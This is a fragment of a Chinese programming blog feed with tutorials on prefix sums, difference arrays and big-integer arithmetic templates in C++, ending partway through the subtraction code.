id="前缀和的作用">前缀和的作用</h3><p>可以快速的求出原数组中一段元素的和，如：求<code>[l, r]</code>范围内的元素的和，其值为：<img src="https://math.now.sh?inline=S_r%20-%20S_%7Bl%20-%201%7D" style="display:inline-block;margin: 0;"/>。</p><p>为什么值是上述公式呢？不要忘记前缀和数组中的元素的定义。它的定义原数组中，前<code>i</code>个元素的和。</p><h2 id="二维数组的前缀和">二维数组的前缀和</h2><h3 id="求元素S-i-2">求元素<img src="https://math.now.sh?inline=S_i" style="display:inline-block;margin: 0;"/></h3><p>对于二维数组的前缀和元素<img src="https://math.now.sh?inline=S_%7Bij%7D" style="display:inline-block;margin: 0;"/>表示的是：<img src="https://math.now.sh?inline=S_%7Bij%7D" style="display:inline-block;margin: 0;"/>左上角部分的那一块子矩阵的元素的和。</p><p>如下图所示：</p><p><img src="https://raw.githubusercontent.com/m-Onst/pics/main/blog/202108/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%89%8D%E7%BC%80%E5%92%8C.png" alt=""></p><p>橘黄色部分的元素之和等于绿颜色矩形中的元素之和加上蓝颜色举行中的颜色之和减去重复运算的蓝绿矩形的交集中的元素之和，最后加上元素<img src="https://math.now.sh?inline=a_%7Bij%7D" style="display:inline-block;margin: 0;"/>，即：<img src="https://math.now.sh?inline=S_%7Bij%7D%20%3D%20S_%7Bi%20-%201%2C%20j%7D%20%2B%20S_%7Bi%2C%20j%20-%201%7D%20-%20S_%7Bi%20-1%2C%20j-%201%7D%20%2B%20a_%7Bij%7D" style="display:inline-block;margin: 0;"/></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; ++j) &#123;</span><br><span class="line">    S[i][j] = S[i - <span class="number">1</span>][j] + S[i][j - <span class="number">1</span>] - S[i - <span class="number">1</span>][j - <span class="number">1</span>] + A[i][j];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在记忆的时候，可以按照上述颜色的图形来记忆，也可以找参照物，即：<strong>使用子矩阵的右下角坐标为参照物</strong>，找上述颜色中的矩形是和它是同一行、前一行、同一列还是前一列。这样就可以快速写出上述公式了。</p><h3 id="求给定区间范围内的元素之和">求给定区间范围内的元素之和</h3><p>其实就是利用的集合的操作，给定两个坐标点<img src="https://math.now.sh?inline=%28x_1%2C%20y_1%29" style="display:inline-block;margin: 0;"/>​和<img src="https://math.now.sh?inline=%28x_2%2C%20y_2%29" style="display:inline-block;margin: 0;"/>​，则在这两个点内的矩阵的元素之和为：</p><p style=""><img src="https://math.now.sh?from=S_%7Bx_2%2C%20y_2%7D%20-%20S_%7Bx_1%20-%201%2C%20y_2%7D%20-%20S_%7Bx_2%2C%20y_1%20-%201%7D%20%2B%20S_%7Bx_1%20-%201%2C%20y_1%20-%201%7D%0A" /></p><p><img src="https://raw.githubusercontent.com/m-Onst/pics/main/blog/202108/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E6%B1%82%E5%AD%90%E7%9F%A9%E9%98%B5%E5%85%83%E7%B4%A0%E4%B9%8B%E5%92%8C.png" alt=""></p><p>其中：</p><ul><li><img src="https://math.now.sh?inline=S_%7Bx_1%20-%201%2C%20y_2%7D" style="display:inline-block;margin: 0;"/>代表的是左侧部分的长方形矩阵</li><li><img src="https://math.now.sh?inline=S_%7Bx_2%2C%20y_1%20-%201%7D" style="display:inline-block;margin: 0;"/>代表的是上面部分的长方形矩阵</li><li><img src="https://math.now.sh?inline=S_%7Bx_1%20-%201%2C%20y_1%20-%201%7D" style="display:inline-block;margin: 0;"/>​代表的是被重复减去的那一块正方形矩阵</li></ul><p>快速写出上述求解公式的方法与求元素<img src="https://math.now.sh?inline=S_i" style="display:inline-block;margin: 0;"/>一致，以待求子矩阵的左上角坐标和右下角坐标为参照物，找到参与运算的子矩阵元素是和这些坐标是同一行、同一列、前一行还是前一列即可快速写出。</p><h1>差分</h1><p>差分和前缀和是一组逆运算。设原数组A中的第i个元素为<img src="https://math.now.sh?inline=a_i" style="display:inline-block;margin: 0;"/>，需要构造一个数组B，使得数组A是数组B的前缀和数组，即：<img src="https://math.now.sh?inline=a_i%20%3D%20b_1%20%2B%20b_2%20%2B%20...%20%2B%20b_i" style="display:inline-block;margin: 0;"/>。B数组称为数组A的差分数组，A数组称为B数组的前缀和数组。</p><h2 id="一维数组">一维数组</h2><h3 id="差分数组的构造与更新">差分数组的构造与更新</h3><p>对于一维数组的差分是比较好构造的，设：</p><p style=""><img src="https://math.now.sh?from=b_1%20%3D%20a_1%20%5C%5C%20b_2%20%3D%20a_2%20-%20a_1%20%5C%5C%20...%20%5C%5C%20b_i%20%3D%20a_i%20-%20a_%7Bi%20-%201%7D%0A" /></p><p>从而有：<img src="https://math.now.sh?inline=a_i%20%3D%20b_1%20%2B%20b_2%20%2B%20...%20%2B%20b_i" style="display:inline-block;margin: 0;"/></p><p>假设原来的数组A中的元素都是0（不管实际中给定的数组A中的元素是否是0，我们都假设原来数组A中的元素都是0），则差分数组B中的元素应该都是0（因为这样才能满足差分数组的定义），这样自然而然的就不需要对差分数组进行初始化了。</p><p>将给定的数组A中的每一个元素视为要加的常数C，那么就可以定义一个插入操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> C)</span> </span>&#123;</span><br><span class="line">  B[l] += C;</span><br><span class="line">  B[r + <span class="number">1</span>] -= C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则对应数组A的差分数组为：<code>insert(i, i, A[i])</code>，<img src="https://math.now.sh?inline=i%20%5Cin%20%5B1%2C%20n%5D" style="display:inline-block;margin: 0;"/>。转为代码为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">  <span class="built_in">insert</span>(i, i, A[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用哨兵数组（假定原数组中的所有元素均为0，则差分数组中的元素均为0），<strong>将差分数组的初始化和对给定连续区间</strong><code>[l, r]</code><strong>内的原数组中的元素都加上常数C的操作统一起来，不用再做额外的操作</strong>。</p><p>即：<strong>利用哨兵技巧，不用考虑差分数组的构造而只需要将精力放到如何更新差分数组中的元素即可</strong>。</p><h3 id="差分数组的应用">差分数组的应用</h3><p>差分数组的性质是：只需要对B数组求一遍前缀和，就可以得到原数组。</p><p>如果对于原数组A中指定的连续区间[l, r]中的每一个元素都需要加上一个常数C，直接对原数组A进行操作的话需要的时间复杂度是O(n)的，而如果使用差分数组则可以将上述操作的时间复杂度降低为O(1)。</p><p>如何操作呢？只需要将元素<img src="https://math.now.sh?inline=b_l" style="display:inline-block;margin: 0;"/>加上一个常量C和<img src="https://math.now.sh?inline=b_%7Br%20%2B%201%7D" style="display:inline-block;margin: 0;"/>上的元素减去一个C即可。根据差分数组的性质，如果只有一个<img src="https://math.now.sh?inline=b_l%20%2B%20C" style="display:inline-block;margin: 0;"/>，则在求原数组中的元素时，区间<code>[l, n]</code>上的所有元素都会加上C。只需要保证<code>[r + 1, n]</code>上的元素不变即可，那么只需要<img src="https://math.now.sh?inline=b_%7Br%20%2B1%7D%20-C" style="display:inline-block;margin: 0;"/>即可保证<code>[r + 1, n]</code>上的元素不变。这就相当于是把连续区间<code>[l, r]</code>上的原数组中的所有元素都加上了一个常数C</p><h2 id="二维数组">二维数组</h2><p>一维数组是将给定的连续区间范围的原数组中的元素均加上一个常数C；而二维数组的操作是对于给定的子矩阵中的每一个元素均加上一个常数C</p><h3 id="差分数组的构造与更新-2">差分数组的构造与更新</h3><p>根据一维差分数组的性质与更新方式，对于二维数组的差分数组也是一样的，对起始点加上一个常量C，以该点为起始点的右下角矩阵中的所有元素都加上常量C。所以，二维数组中的差分数组为了保证还是原数组A的差分数组，则需要进行一系列的调整。</p><p><img src="https://raw.githubusercontent.com/m-Onst/pics/main/blog/202108/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84%E7%9A%84%E6%9B%B4%E6%96%B0.png" alt=""></p><p>根据上图所示，设：<img src="https://math.now.sh?inline=%28x%2C%20y%29%20%3D%20(x_1%2C%20y_1)%2C(i%2C%20j)%20%3D%20(x_2%2C%20y_2)" style="display:inline-block;margin: 0;"/>，则对于原数组A中给定待操作矩阵中每个元素加上常数C，等价于差分数组：</p><p style=""><img src="https://math.now.sh?from=B_%7Bx_1%2C%20y_1%7D%20%3D%20B_%7Bx_1%2C%20y_1%7D%20%2B%20C%20%5C%5C%20B_%7Bx_1%2C%20y_2%7D%20%3D%20%20B_%7Bx_1%2C%20y_2%7D%20-%20C%20%5C%5C%20B_%7Bx_2%2C%20y_1%7D%20%3D%20B_%7Bx_2%2C%20y_1%7D%20-%20C%20%5C%5C%20B_%7Bx_2%20%2B%201%2C%20y_2%20%2B%201%7D%20%3D%20B_%7Bx_2%20%2B%201%2C%20y_2%20%2B%201%7D%20%2B%20C%0A" /></p><p>用代码表示的话则是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x1, <span class="keyword">int</span> y1, <span class="keyword">int</span> x2, <span class="keyword">int</span> y2, <span class="keyword">int</span> C)</span> </span>&#123;</span><br><span class="line">  B[x1][y1] += C;</span><br><span class="line">  B[x1][y2 + <span class="number">1</span>] -= C;</span><br><span class="line">  B[x2 + <span class="number">1</span>][y1] -= C;</span><br><span class="line">  B[x2 + <span class="number">1</span>][y2 + <span class="number">1</span>] += C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二维差分数组的构造和一维差分数组的构造一样，利用哨兵，可以将差分数组的构造和更新的操作统一起来。构造二维差分数组的方法为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">insert</span>(i, j, i, j, a[i][j]);</span><br></pre></td></tr></table></figure><p>该函数的作用是：起始点坐标到终点坐标的矩阵中的元素都加上常数C。所以在插入原数组时，其实就是在说：在当前坐标下，将原数组的元素<code>a[i][j]</code>视为常数C，使其满足以元素<code>a[i][j]</code>为其前缀和的差分性质。</p><p>在最后计算加和得到原矩阵时，使用的是计算前缀数组的方式来迭代计算的。也就是说要根据差分矩阵计算原矩阵，其实就是求前缀和的过程。所以需要使用二维数组求前缀和的方式来计算。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;前缀和与差分&lt;/h1&gt;
&lt;p&gt;设原数组为A，其中的第i个元素为&lt;img src=&quot;https://math.now.sh?inline=a_i&quot; style=&quot;display:inline-block;margin: 0;&quot;/&gt;，则前缀和数组的第i个位置的元素&lt;img s</summary>
      
    
    
    
    <category term="算法" scheme="https://4st.tech/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="前缀和" scheme="https://4st.tech/tags/%E5%89%8D%E7%BC%80%E5%92%8C/"/>
    
    <category term="差分" scheme="https://4st.tech/tags/%E5%B7%AE%E5%88%86/"/>
    
  </entry>
  
  <entry>
    <title>基础算法：高精度大整数运算</title>
    <link href="https://4st.tech/2021/08/08/ji-chu-suan-fa-gao-jing-du-da-zheng-shu-yun-suan/"/>
    <id>https://4st.tech/2021/08/08/ji-chu-suan-fa-gao-jing-du-da-zheng-shu-yun-suan/</id>
    <published>2021-08-08T11:48:36.000Z</published>
    <updated>2021-08-13T09:00:05.905Z</updated>
    
    <content type="html"><![CDATA[<h1>高精度大整数运算</h1><p>只针对C++来说，因为C++没有大整数类，而java具有大整数类，python的整数是无限位的</p><p>对于大数运算，一般有以下几种情况：</p><ul><li><img src="https://math.now.sh?inline=A%20%2B%20B" style="display:inline-block;margin: 0;"/>型，其中这两个的位数大概在<img src="https://math.now.sh?inline=10%5E6" style="display:inline-block;margin: 0;"/></li><li><img src="https://math.now.sh?inline=A%20-%20B" style="display:inline-block;margin: 0;"/>型，其中这两个的位数大概在<img src="https://math.now.sh?inline=10%5E6" style="display:inline-block;margin: 0;"/></li><li><img src="https://math.now.sh?inline=A%20%5Ctimes%20%5Calpha" style="display:inline-block;margin: 0;"/>，其中A的长度不超过<img src="https://math.now.sh?inline=10%5E6" style="display:inline-block;margin: 0;"/>，<img src="https://math.now.sh?inline=%5Calpha" style="display:inline-block;margin: 0;"/>是一个小整数，不超过<img src="https://math.now.sh?inline=10%5E5" style="display:inline-block;margin: 0;"/></li><li><img src="https://math.now.sh?inline=A%20%5Ctimes%20B" style="display:inline-block;margin: 0;"/>型，两个都是超长的整数，但是面试时要让写的概率不大</li><li><img src="https://math.now.sh?inline=%5Cfrac%7BA%7D%7BB%7D" style="display:inline-block;margin: 0;"/>型，两个都是超长的正数，面试时让写的概率不大</li></ul><h1>基本思想</h1><h2 id="大整数的存储">大整数的存储</h2><p>由于位数较多，一个int变量根本存放不下（可表示的最大整数是2147483647，共10位，并不能存放的下），所以可以使用数组来进行存放。</p><p>在使用数组存放的时候就有一个问题，采用小端方式还是大端方式存放，哪一个对要做的高精度整数运算更加方便呢？比较建议的是使用小端方式，即：低地址（数组下标0开始）存放个位，然后依次往后存放高位。</p><p>采用小端方式存放的原因是，在做运算时会有进位，如果从数组下标0开始依次存放大整数的个位的话，方便进位操作。因为<strong>可能会出现需要在高位补上额外的一个1，对于数组来说，在下标0处添加高位进位还需要将后面的数依次向后移动一个位置，降低了效率</strong>；而在最后面补上进位的话就方便许多，并不需要进行移位操作。</p><p>由于可能会出现混合运算，因此对于大整数的加减乘除都需要保证存储格式要一致。</p><h2 id="大整数的运算">大整数的运算</h2><p>其实本质上就是模拟小学学过的竖式运算。</p><p>要注意，本专题讨论的大整数运算的前提是两个大整数都是非负数，即：<img src="https://math.now.sh?inline=A%20%5Cge%200%2C%20B%5Cge%200" style="display:inline-block;margin: 0;"/>。如果不都是非负数，则是输入输出的问题了。</p><h3 id="大整数加法">大整数加法</h3><p>竖式加法运算的步骤：</p><ol><li>个位与个位相加，如果计算结果大于10，则向前进位，并对10取余（模），得到最终结果的个位应该存放的值</li><li>然后是十位与十位相加，并加上进位。如果计算结果大于10，继续向前进位，并对10取余，得到最终结果的十位应该存放的值</li><li>重复上述操作，直到计算完毕</li></ol><p>观察上述计算步骤，其实是三个数在做加法：两个位置的数相加再加上进位得到结果。</p><h3 id="大整数减法">大整数减法</h3><p>竖式减法运算的步骤：</p><ol><li>个位与个位相减，如果不够减，则向前借一位，即：被减数的个位 + 10 - 减数的个位；被减数的十位要减去1</li><li>然后轮到十位进行上述运算</li><li>重复上述操作，直到计算完毕</li></ol><p>上述运算步骤其实是三个数在参与运算：</p><ul><li>如果没有借位的话，则是<img src="https://math.now.sh?inline=A_i%20-%20B_i%20%2B%20Carry" style="display:inline-block;margin: 0;"/>，此时借位<code>carry</code>为0</li><li>如果有借位的话，则是<img src="https://math.now.sh?inline=A_i%20%2B%20Carry%20-%20B_i" style="display:inline-block;margin: 0;"/>，此时借位<code>carry</code>为10</li></ul><p>因此，做大整数减法的话是要分两个步骤</p><ol><li>如果A小于B，则计算<img src="https://math.now.sh?inline=-%28B%20-%20A%29" style="display:inline-block;margin: 0;"/>。即，先交换做减法，后补上一个负号</li><li>如果A不小于B，则直接做减法即可</li></ol><h3 id="大整数乘法">大整数乘法</h3><p>与加减法的比较类似，只需要找到其中几个关键点：</p><ul><li>进位的值等于<img src="https://math.now.sh?inline=carry%20%3D%20%5Clfloor%20%28A%5Bi%5D%20%5Ctimes%20B%29%20%2F%2010%20%5Crfloor" style="display:inline-block;margin: 0;"/></li><li>当前位的值<img src="https://math.now.sh?inline=%28A%5Bi%5D%20%5Ctimes%20B%29%5C%25%2010" style="display:inline-block;margin: 0;"/></li><li>高位的值为<img src="https://math.now.sh?inline=%28A%5Bi%2B1%5D%20%5Ctimes%20B%20%2B%20carry%29%20%25%2010" style="display:inline-block;margin: 0;"/></li></ul><p>需要注意的是，它是用A的每一位整体乘以的B，所以要求B不能太大，<code>int</code>能存放的下才行。</p><h3 id="大整数除法">大整数除法</h3><p>前提是高精度的整数除以低精度的整数，与大整数乘法的要求差不多。</p><p>回顾除法的竖式计算，设余数为r，被除数为A，除数为b，商为q，则有：<img src="https://math.now.sh?inline=q%20%3D%20%28r%20*%2010%20%2B%20A%5Bi%5D%29%20%2F%20b%2Cr%20%3D%20(r%20*%2010%20%2B%20A%5Bi%5D)%20%5C%25%2010" style="display:inline-block;margin: 0;"/>。简单的来说就是：</p><ul><li>商等于高精度整数A的当前位加上余数乘以10除以除数。也就是列竖式中第二步中，高位的商求出来后，继续进行下一步的运算时的落式运算</li><li>求落式运算中，做完减法剩下来的余数的高位是多少</li></ul><p>为了统一操作，高精度整数的加减乘除都使用哨兵，记初始状态的进位为0，从而可以省略了分支结构。</p><p>需要注意的是：</p><ul><li>大整数除法是从高位开始的，而其他三种运算都是从低位开始做运算的</li><li>由于大整数除法是从高位开始做运算的，因此为了统一大整数的存储格式，其最后运算的结果要使用<code>reverse(vector.begin(), vector.end())</code>来做逆置操作</li></ul><h1>算法模板</h1><h2 id="大整数加法-2">大整数加法</h2><h3 id="迭代式">迭代式</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A &gt;= 0, B &gt;= 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">add</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 由于没有判断A和B哪个位数更长，而加法运算需要对每一个数位上的值都要加上一遍</span></span><br><span class="line">    <span class="comment">// 因此不能提前退出，使用或条件</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || i &lt; B.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> result = carry;</span><br><span class="line">        <span class="comment">// 当要加上的整数还没运算完时，加上对应的位置上的整数</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            result += A[i];            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            result += B[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对10取模，得到该位置上的值</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 计算进位</span></span><br><span class="line">        carry = result / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当还有进位的时候，证明需要在最高位补上一个1</span></span><br><span class="line">    <span class="keyword">if</span> (carry) &#123;</span><br><span class="line">        ans.<span class="built_in">push_back</span>(carry);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归式">递归式</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">add</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">      <span class="comment">// 让竖式计算的最上面的那个整数是最长的</span></span><br><span class="line">      <span class="keyword">if</span> (A.<span class="built_in">size</span>() &lt; B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">add</span>(B, A);</span><br><span class="line">      &#125;    </span><br><span class="line">            </span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> result = carry +  A[i];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 当要加上的整数还没运算完时，加上对应的位置上的整数</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            result += B[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对10取模，得到该位置上的值</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 计算进位</span></span><br><span class="line">        carry = result / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 当还有进位的时候，证明需要在最高位补上一个1</span></span><br><span class="line">    <span class="keyword">if</span> (carry) &#123;</span><br><span class="line">        ans.<span class="built_in">push_back</span>(carry);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大整数减法-2">大整数减法</h2><h3 id="比较两个大整数谁大">比较两个大整数谁大</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比较大整数A是否不小于大整数B</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A.<span class="built_in">size</span>() != B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> A.<span class="built_in">size</span>() &gt;= B.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 这三个连续的if可以做优化，合并掉多余的操作</span></span><br><span class="line">        <span class="keyword">if</span> (A[i] == B[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (A[i] &gt; B[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>for</code>循环遍历的优化写法，省掉了多个分支判断：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比较大整数A是否不小于大整数B</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A.<span class="built_in">size</span>() != B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> A.<span class="built_in">size</span>() &gt;= B.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 根据上面的分支情况，可以归结为，当两个值不等时，比较它俩的大小</span></span><br><span class="line">        <span class="comment">// 因此可以写成下面的这种情况</span></span><br><span class="line">        <span class="keyword">if</span> (A[i] != B[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> A[i] &gt; B[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="大整数减法模板">大整数减法模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 先利用大整数比较，来将问题转为A - B的情况</span></span><br><span class="line"><span class="comment">vector&lt;int&gt; ans;</span></span><br><span class="line"><span class="comment">// 比较A是否不小于大整数B</span></span><br><span class="line"><span class="comment">if (cmp(A, B) == true) &#123;</span></span><br><span class="line"><span class="comment">    ans = sub(A, B);</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">&#125; else &#123;</span></span><br><span class="line"><span class="comment">    ans = sub(B, A);</span></span><br><span class="line"><span class="comment">    printf(&quot;-&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sub</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span 